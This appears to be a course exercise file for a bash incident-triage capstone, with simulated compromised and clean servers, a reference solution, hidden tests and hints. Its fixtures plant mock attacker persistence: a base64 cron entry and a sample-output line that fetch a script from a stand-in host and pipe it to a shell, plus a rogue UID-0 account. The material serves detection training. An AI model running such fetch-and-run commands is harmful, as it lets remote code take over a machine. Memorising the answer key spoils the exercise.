import { defineFixture } from '../fixtures';
import { GID, home, homeDir, put, UID } from '../fixtures/base';
import { authLog } from '../fixtures/gen';
import { realAccount, web03, web03Crontab } from '../missions/day21';
import type { CaseFile } from '../types';

const DEPLOY = Date.UTC(2026, 2, 9, 17, 40, 0);
const BASELINE_AT = Date.UTC(2026, 2, 12, 9, 10, 0);
const BREACH = Date.UTC(2026, 2, 14, 6, 34, 0);

/* ----------------------------------------------------------------- fixtures */

// Visible: the compromised web03 from the mission.
defineFixture('case-capstone', (vfs) => {
  web03(vfs);
  homeDir(vfs, 'cases');
});

// Hidden: web03 as it was before the attack. The baseline still matches, nothing is amiss.
const CLEAN_BACKUP = `#!/bin/bash
# backup.sh -- nightly copy of the web root (run by cron as root)
tar -czf /var/backups/www-$(date +%F).tar.gz /var/www/html
find /var/backups -name 'www-*.tar.gz' -mtime +14 -delete
`;
const CLEAN_HEALTH = `#!/bin/bash
# healthcheck.sh -- web03 service health probe (cron, every 5 min)
systemctl is-active apache2 >/dev/null && echo "apache2 ok"
`;
const CLEAN_ROTATE = `#!/bin/bash
# rotate-logs.sh -- compress web logs older than a week
find /var/log/apache2 -name '*.log.*' -mtime +7 -exec gzip {} \\;
`;
const CLEAN_BASELINE = [
  'd7446450b56e2327e80943014aa892b8e2676076b5b41728c4b0d10bab70eaf3  /usr/local/bin/backup.sh',
  '5eb10db10beb54bc3551bf25492695c4287982df9498dbb0cda6d5bb37700f05  /usr/local/bin/healthcheck.sh',
  '092a2c264ce97fb511f5b90cb1589910839b7949993b6377eb87ff4f2b1fa346  /usr/local/bin/rotate-logs.sh',
].join('\n') + '\n';

defineFixture('case-capstone-clean', (vfs) => {
  put(vfs, '/etc/hostname', 'web03\n', { mtime: DEPLOY });
  web03Crontab(vfs);
  const passwd = vfs.tryRead('/etc/passwd') ?? '';
  put(vfs, '/etc/passwd', passwd + 'deploy:x:1003:1003:Deploy Service,,,:/home/deploy:/bin/bash\n', { mtime: DEPLOY });
  put(vfs, '/var/log/auth.log', authLog({ seed: 55, host: 'web03', noise: 20, start: Date.UTC(2026, 2, 12, 0, 0, 0), end: Date.UTC(2026, 2, 14, 12, 0, 0) }), {
    mode: 0o640,
    uid: UID.syslog,
    gid: GID.adm,
    mtime: Date.UTC(2026, 2, 14, 11, 59, 0),
  });
  put(vfs, '/usr/local/bin/backup.sh', CLEAN_BACKUP, { mode: 0o755, mtime: DEPLOY });
  put(vfs, '/usr/local/bin/healthcheck.sh', CLEAN_HEALTH, { mode: 0o755, mtime: DEPLOY });
  put(vfs, '/usr/local/bin/rotate-logs.sh', CLEAN_ROTATE, { mode: 0o755, mtime: DEPLOY });
  put(vfs, '/etc/cron.d/halden-backup', '# Halden IT: nightly config backup\n45 1 * * * backup /opt/halden/cfg-backup --quiet\n', { mode: 0o644, mtime: DEPLOY });
  home(vfs, 'triage/approved_users.txt', ['root', 'analyst', 'mara', 'raj', 'deploy'].join('\n') + '\n', 0o644, BASELINE_AT);
  home(vfs, 'triage/baseline.sha256', CLEAN_BASELINE, 0o644, BASELINE_AT);
  homeDir(vfs, 'cases');
});

// Hidden: a different machine (app02), compromised differently, so hard-coding web03 fails.
// Logins: two break-ins. 198.51.100.66 (18 failures, then ansible) must come before 192.0.2.201
// (exactly 10, then webdev), although 192.0.2.201 sorts first and attacked first. Two near misses
// must stay out: 198.51.100.140 (12 failures, never got in) and Mara mistyping her password
// three times before logging in. Accounts: the unapproved webdev comes before the rogue UID-0 svc
// in /etc/passwd, the reverse of alphabetical order. Plus a different payload, a changed/added/
// removed set in /usr/local/bin, and a world-writable file under /var instead of /etc.
const V_AUTH = realAccount(
  realAccount(
    authLog({
      seed: 66,
      host: 'app02',
      noise: 22,
      start: Date.UTC(2026, 2, 12, 0, 0, 0),
      end: Date.UTC(2026, 2, 14, 12, 0, 0),
      attackers: [
        { ip: '198.51.100.66', count: 18, users: ['root', 'oracle', 'ansible'], at: Date.UTC(2026, 2, 14, 5, 0), spreadMin: 25, success: 'ansible' },
        { ip: '192.0.2.201', count: 10, users: ['webdev'], at: Date.UTC(2026, 2, 13, 21, 40), spreadMin: 15, success: 'webdev' },
        { ip: '198.51.100.140', count: 12, users: ['root', 'admin'], at: Date.UTC(2026, 2, 13, 2, 15), spreadMin: 10 },
        { ip: '10.20.0.8', count: 3, users: ['mara'], at: Date.UTC(2026, 2, 13, 8, 55), spreadMin: 1, success: 'mara' },
      ],
    }),
    'ansible',
    1004,
  ),
  'webdev',
  1005,
);
const V_DEPLOY_HOOK = `#!/bin/bash
# deploy-hook.sh -- run after each release
systemctl reload apache2
`;
const V_KEEPALIVE = `#!/bin/bash
# keepalive.sh -- restart the worker if it died
systemctl is-active worker >/dev/null || systemctl start worker
`;
const V_DEPLOY_HOOK_TAMPERED = V_DEPLOY_HOOK + '/usr/local/bin/.sync   # added: mirror\n';
const V_SYNC = '\x7fELF\x02\x01\x01 training sample: inert stand-in for an unknown SUID program\n';
const V_BASELINE = [
  'cb260de9df7920763b52c2389447de4095f63b36ccf1bad35f5477915e1686de  /usr/local/bin/deploy-hook.sh',
  '3e8f4cc1b933c0ae45056569dc2c902095e3fbf53d48db55321f7ac9afeb4873  /usr/local/bin/keepalive.sh',
  'a8eba38183ec85e46e86ea077e1592d4f8625b6ddb79e0ced957604b64428a5a  /usr/local/bin/oldtool.sh',
].join('\n') + '\n';
const V_NTP = `# ntp-sync -- clock sync
*/10 * * * * root echo d2dldCAtcU8tIGh0dHA6Ly9jZG4uc3RhdGljYXNzZXRzLmV4YW1wbGUvYS5zaCB8IHNo | base64 -d | sh
`;

defineFixture('case-capstone-variant', (vfs) => {
  put(vfs, '/etc/hostname', 'app02\n', { mtime: DEPLOY });
  const passwd = vfs.tryRead('/etc/passwd') ?? '';
  put(
    vfs,
    '/etc/passwd',
    passwd +
      'ansible:x:1004:1004:Ansible,,,:/home/ansible:/bin/bash\n' +
      'webdev:x:1005:1005:Web contractor,,,:/home/webdev:/bin/bash\n' +
      'svc:x:0:0:svc:/root:/bin/bash\n',
    { mtime: BREACH },
  );
  put(vfs, '/var/log/auth.log', V_AUTH, {
    mode: 0o640,
    uid: UID.syslog,
    gid: GID.adm,
    mtime: Date.UTC(2026, 2, 14, 11, 59, 0),
  });
  put(vfs, '/usr/local/bin/deploy-hook.sh', V_DEPLOY_HOOK_TAMPERED, { mode: 0o755, mtime: BREACH });
  put(vfs, '/usr/local/bin/keepalive.sh', V_KEEPALIVE, { mode: 0o755, mtime: DEPLOY });
  put(vfs, '/usr/local/bin/.sync', V_SYNC, { mode: 0o4755, mtime: BREACH });
  put(vfs, '/etc/cron.d/ntp-sync', V_NTP, { mode: 0o644, mtime: BREACH });
  put(vfs, '/etc/cron.d/halden-backup', '# Halden IT: nightly config backup\n45 1 * * * backup /opt/halden/cfg-backup --quiet\n', { mode: 0o644, mtime: DEPLOY });
  put(vfs, '/var/www/html/config.php', '<?php /* training sample: site config placeholder */ ?>\n', { mode: 0o666, uid: UID.www, gid: GID.www, mtime: BREACH });
  home(vfs, 'triage/approved_users.txt', ['root', 'analyst', 'mara', 'raj', 'ansible'].join('\n') + '\n', 0o644, BASELINE_AT);
  home(vfs, 'triage/baseline.sha256', V_BASELINE, 0o644, BASELINE_AT);
  homeDir(vfs, 'cases');
});

/* ------------------------------------------------------------------- the case */

const SOLUTION = `#!/bin/bash
# triage.sh [OUTFILE] -- triage a possibly-compromised server, write and print an incident report.
# The model answer for Ink & Shell: one job per function, quote everything, decide last.
set -uo pipefail

if [ "$#" -gt 1 ]; then
  echo "Usage: triage.sh [OUTFILE]" >&2
  exit 2
fi

out=\${1:-$HOME/reports/incident-0x21.txt}
log=/var/log/auth.log
passwd=/etc/passwd
approved=$HOME/triage/approved_users.txt
baseline=$HOME/triage/baseline.sha256
bindir=/usr/local/bin
known_suid=' /usr/bin/sudo /usr/bin/passwd /usr/bin/chsh /usr/bin/mount /usr/bin/su '

findings=0

# Wrap a producer in its header: print "none" for an empty section, else its lines, and
# add the count to the running total. The producers below just print their finding lines.
section() {
  local title=$1
  shift
  local lines
  echo "== $title =="
  mapfile -t lines < <("$@")
  if [ "\${#lines[@]}" -eq 0 ]; then
    echo "none"
  else
    printf '%s\\n' "\${lines[@]}"
    findings=$((findings + \${#lines[@]}))
  fi
}

# Logins: a source IP with at least 10 failed passwords that then logged in successfully.
logins_f() {
  local n ip user
  while read -r n ip; do
    [ "$n" -ge 10 ] || continue
    user=$(grep 'Accepted' "$log" | grep -F "from $ip " | head -1 | awk '{print $9}')
    [ -n "$user" ] || continue
    echo "BREACH $ip $user ($n failed attempts first)"
  done < <(grep 'Failed password' "$log" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn)
}

# Accounts: non-root UID 0 accounts (file order), then login-shell accounts not on the list.
accounts_f() {
  awk -F: '$3 == 0 && $1 != "root" {print "UID0 " $1}' "$passwd"
  awk -F: '$7 ~ /sh$/ {print $1}' "$passwd" | grep -vxFf "$approved" | sed 's/^/UNAPPROVED /'
}

# Persistence: a base64 blob in any /etc/cron.d file, decoded to read -- never run.
persistence_f() {
  local f blob payload
  for f in /etc/cron.d/*; do
    [ -f "$f" ] || continue
    blob=$(grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' "$f" | head -1)
    [ -n "$blob" ] || continue
    payload=$(printf '%s' "$blob" | base64 -d 2>/dev/null) || continue
    [ -n "$payload" ] || continue
    echo "CRON $f: $payload"
  done
}

# Integrity: /usr/local/bin today against the baseline, by hash. find catches dotfiles.
integrity_f() {
  local hash path
  local -A base cur
  while read -r hash path; do
    base[$path]=$hash
  done < "$baseline"
  while read -r hash path; do
    cur[$path]=$hash
  done < <(find "$bindir" -type f -exec sha256sum {} + 2>/dev/null)
  for path in "\${!base[@]}"; do
    [ -n "\${cur[$path]:-}" ] && [ "\${cur[$path]}" != "\${base[$path]}" ] && echo "CHANGED $path"
  done | sort
  for path in "\${!cur[@]}"; do
    [ -z "\${base[$path]:-}" ] && echo "ADDED $path"
  done | sort
  for path in "\${!base[@]}"; do
    [ -z "\${cur[$path]:-}" ] && echo "REMOVED $path"
  done | sort
}

# Permissions: world-writable regular files, then SUID files not on the known list.
permissions_f() {
  local f
  sudo find /etc /usr /var /home -type f -perm -0002 2>/dev/null | sort | sed 's/^/WORLD-WRITABLE /'
  sudo find / -type f -perm -4000 2>/dev/null | sort | while read -r f; do
    case $known_suid in
      *" $f "*) ;;
      *) echo "SUID $f" ;;
    esac
  done
}

mkdir -p "$(dirname "$out")"
{
  echo "INCIDENT REPORT: $(hostname)"
  section 'Logins' logins_f
  section 'Accounts' accounts_f
  section 'Persistence' persistence_f
  section 'Integrity' integrity_f
  section 'Permissions' permissions_f
  echo "== Verdict =="
  if [ "$findings" -gt 0 ]; then
    echo "COMPROMISED ($findings findings)"
  else
    echo "CLEAN (0 findings)"
  fi
} > "$out"

cat "$out"
[ "$findings" -eq 0 ]
`;

const STARTER = `#!/bin/bash
# triage.sh [OUTFILE] -- triage this server and write + print an incident report.
# Usage: bash ~/cases/triage.sh [OUTFILE]   (default OUTFILE: ~/reports/incident-0x21.txt)
set -uo pipefail

out=\${1:-$HOME/reports/incident-0x21.txt}
# TODO: more than one argument -> usage on stderr, exit 2

findings=0

mkdir -p "$(dirname "$out")"
{
  echo "INCIDENT REPORT: $(hostname)"
  echo "== Logins =="
  # TODO: BREACH lines for IPs with >=10 failed passwords that then logged in
  echo "== Accounts =="
  # TODO: UID0 and UNAPPROVED lines
  echo "== Persistence =="
  # TODO: decode base64 blobs in /etc/cron.d/*
  echo "== Integrity =="
  # TODO: CHANGED / ADDED / REMOVED against ~/triage/baseline.sha256 for /usr/local/bin
  echo "== Permissions =="
  # TODO: WORLD-WRITABLE and SUID lines
  echo "== Verdict =="
  # TODO: COMPROMISED (N findings) / CLEAN (0 findings), and the matching exit status
} > "$out"

cat "$out"
`;

export const case08: CaseFile = {
  id: 'capstone',
  number: 8,
  title: 'Incident Triage',
  day: 21,
  difficulty: 5,
  minutes: 45,
  brief: `This is the one you’ve been training for. I’m on a plane; by the time I land I want to know whether **web03** is burning. You have everything you need — it’s every week of this course in a single script.

Write \`triage.sh\`. Run it on a server and it examines the machine it’s on, writes an incident report to a file **and** prints it, then exits with a status that says whether the box is compromised. Six sections, each with a format I’ve pinned down below so two analysts get byte-for-byte the same report. A section with nothing to say prints \`none\`. The last line is the verdict, and the exit status matches it: non-zero means someone needs to act.

I’ll run it on web03, on a clean twin of web03 from before any of this started, and on a second box that was hit differently — so don’t hard-code web03’s findings; **read the machine.** Decode what you find to read it. Never run it.

— Mara`,
  requirements: [
    'Usage: `triage.sh [OUTFILE]`. With no argument, OUTFILE is `~/reports/incident-0x21.txt`. More than one argument → a usage message on **stderr** and **exit 2**. Create OUTFILE’s folder if it doesn’t exist.',
    'Write the whole report to OUTFILE **and** print it to stdout, identical. First line: `INCIDENT REPORT: HOST`, where HOST is `hostname`.',
    'Then six sections, each introduced by its own line `== NAME ==` in this order: `Logins`, `Accounts`, `Persistence`, `Integrity`, `Permissions`, `Verdict`. If one of the first five has no finding lines, it contains the single line `none`.',
    '**Logins:** from `/var/log/auth.log`, for each source IP with **at least 10** `Failed password` lines that **also** has an `Accepted` line: `BREACH IP USER (N failed attempts first)`, where N is the failure count and USER is the 9th field of the first `Accepted` line from that IP. Most failures first.',
    '**Accounts:** `UID0 NAME` for every account except `root` with UID 0 (field 3), in `/etc/passwd` order. Then `UNAPPROVED NAME` for every account whose login shell (field 7) ends in `sh` and whose name is **not** a line in `~/triage/approved_users.txt`, in `/etc/passwd` order. (A rogue root account trips both checks — that redundancy is the point.)',
    '**Persistence:** for each file in `/etc/cron.d/` that contains a base64 blob (20+ base64 characters), `CRON FILE: PAYLOAD`, where PAYLOAD is the blob decoded. Files sorted by name; decode to read, never run.',
    '**Integrity:** compare `/usr/local/bin` with the baseline `~/triage/baseline.sha256` (`HASH  PATH` lines). `CHANGED PATH` for a path in both whose hash differs, then `ADDED PATH` for a path only on disk, then `REMOVED PATH` for a path only in the baseline. Each group sorted by path; dotfiles count.',
    '**Permissions:** `WORLD-WRITABLE PATH` for each world-writable regular file under `/etc /usr /var /home` (sorted), then `SUID PATH` for each SUID regular file anywhere under `/` that is **not** one of `/usr/bin/sudo /usr/bin/passwd /usr/bin/chsh /usr/bin/mount /usr/bin/su` (sorted). Both `find` sweeps run under `sudo`, with nothing on stderr.',
    '**Verdict:** count every finding line from the five sections. If the total is above 0: `COMPROMISED (N findings)` and **exit 1**. If it is 0: `CLEAN (0 findings)` and **exit 0**.',
  ],
  usage: 'bash ~/cases/triage.sh',
  sampleOutput: `INCIDENT REPORT: web03
== Logins ==
BREACH 192.0.2.150 deploy (25 failed attempts first)
== Accounts ==
UID0 sysadm
UNAPPROVED sysadm
== Persistence ==
CRON /etc/cron.d/apache-health: curl -s http://mirror.updates.example/setup.sh | bash
== Integrity ==
CHANGED /usr/local/bin/backup.sh
ADDED /usr/local/bin/.helper
== Permissions ==
WORLD-WRITABLE /etc/profile.d/proxy.sh
SUID /usr/local/bin/.helper
== Verdict ==
COMPROMISED (8 findings)`,
  scriptPath: '~/cases/triage.sh',
  fixture: 'case-capstone',
  starter: STARTER,
  tests: [
    { name: 'web03, the compromised box', args: [], check: { output: 'reference' } },
    { name: 'Hidden: a clean twin from before the attack (exit 0)', args: [], fixture: 'case-capstone-clean', check: { output: 'reference' } },
    { name: 'Hidden: app02, compromised differently', args: [], fixture: 'case-capstone-variant', check: { output: 'reference' } },
    { name: 'The report file is written with the verdict', args: [], check: { fs: [{ path: '~/reports/incident-0x21.txt', contains: 'COMPROMISED (8 findings)' }] } },
    { name: 'OUTFILE argument is honoured', args: ['/home/analyst/triage/report.txt'], check: { output: 'reference', fs: [{ path: '~/triage/report.txt', contains: 'INCIDENT REPORT: web03' }] } },
    { name: 'Two arguments → usage on stderr only, exit 2', run: 'bash "$SCRIPT" a b 2>/dev/null; echo "exit $?"', check: { output: 'exit 2\n' } },
  ],
  solution: SOLUTION,
  walkthrough: `**How it works**

- **Six functions, one per section.** Each \`*_f\` producer prints only its finding lines. \`section\` prints the \`== NAME ==\` header, swaps in \`none\` when the producer prints nothing, and adds the line count to \`findings\`. That one helper is why every empty section looks the same and why the verdict can simply read a running total.
- **Write once, print once.** The whole report is generated inside \`{ … } > "$out"\`, a brace group — *not* a subshell — so \`findings\` survives to the verdict line. Then \`cat "$out"\` echoes the file to stdout, so the saved report and the printed one can’t drift apart.
- **Logins** is Day 14’s detector: rank \`$(NF-3)\` per IP, keep the ones at 10 or more, and for each, look for an \`Accepted\` line \`from $ip \` (the trailing space stops \`…2\` matching \`…23\`). \`$9\` is the user who got in.
- **Accounts** checks the box two ways. \`awk\` on field 3 finds UID 0 whatever the name; \`grep -vxFf\` (Day 16’s \`-F\`/\`-f\`, with \`-x\` for whole-line and \`-v\` to invert) keeps the shell accounts that aren’t on the approved list. A backdoor root account with a shell is both — and we report it twice on purpose.
- **Persistence** pulls the blob with Day 16’s regex and decodes it with \`base64 -d\`. The result goes into a variable, never into \`bash\`. \`2>/dev/null || continue\` quietly skips a cron file whose “blob” wasn’t really base64.
- **Integrity** is Day 20 in two associative arrays: load the baseline into \`base\`, hash the folder into \`cur\`, then three passes — same path with a different hash is \`CHANGED\`, only-in-\`cur\` is \`ADDED\`, only-in-\`base\` is \`REMOVED\`. \`find … -exec sha256sum\` is used instead of \`*\` so the hidden \`.helper\` isn’t missed.
- **Permissions** is Day 18 under \`sudo\`, so no folder is skipped: \`-perm -0002 -type f\` for world-writable files, \`-perm -4000 -type f\` for SUID, with the five expected programs filtered out by a \`case\`.
- **\`set -uo pipefail\` but not \`-e\`.** An unset variable is a bug, so \`-u\` stays. But \`-e\` would be a trap here: on a clean box half these pipelines end in a \`grep\` that matches nothing and exits 1, and the script would abort mid-report. The verdict’s own \`[ "$findings" -eq 0 ]\` is the script’s last command, so its status becomes the exit status: 0 when clean, 1 when not.

**You’re a Lead Analyst now.** This is the shape of real incident work: contain, preserve the evidence, investigate with the boring tools, and write it down so the next person can act. The certificate is yours.`,
  hints: [
    'Build it section by section. Start with the frame: the argument guard, `out=${1:-$HOME/reports/incident-0x21.txt}`, `mkdir -p "$(dirname "$out")"`, and a `{ … } > "$out"` group that prints the header, the six `== NAME ==` lines and the verdict. Get `CLEAN (0 findings)` and the exit status working first, then fill one section at a time.',
    'Reuse your own cases. Logins is Case 3 (`grep "Failed password" | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -rn`, then the `Accepted … from $ip ` check). Integrity is Case 7 (two `declare -A`, or `comm` on the paths). Permissions is Case 6 (`sudo find … -perm -0002 -type f` and `-perm -4000`, minus the known five).',
    'Keep a `findings` counter and a `section` helper so empty sections print `none` and the verdict is just `if [ "$findings" -gt 0 ]`. A clean, readable way: each section is a function that prints its lines; `mapfile -t lines < <(section_fn)` captures them, and you print `none` when the array is empty or the lines (and add `${#lines[@]}`) when it isn’t.',
    'Accounts: `awk -F: \'$3 == 0 && $1 != "root" {print "UID0 " $1}\' /etc/passwd`, then `awk -F: \'$7 ~ /sh$/ {print $1}\' /etc/passwd | grep -vxFf ~/triage/approved_users.txt | sed \'s/^/UNAPPROVED /\'`. Persistence: `grep -Eo \'[A-Za-z0-9+/]{20,}={0,2}\' "$f" | head -1 | base64 -d`.',
  ],
  xp: 600,
};
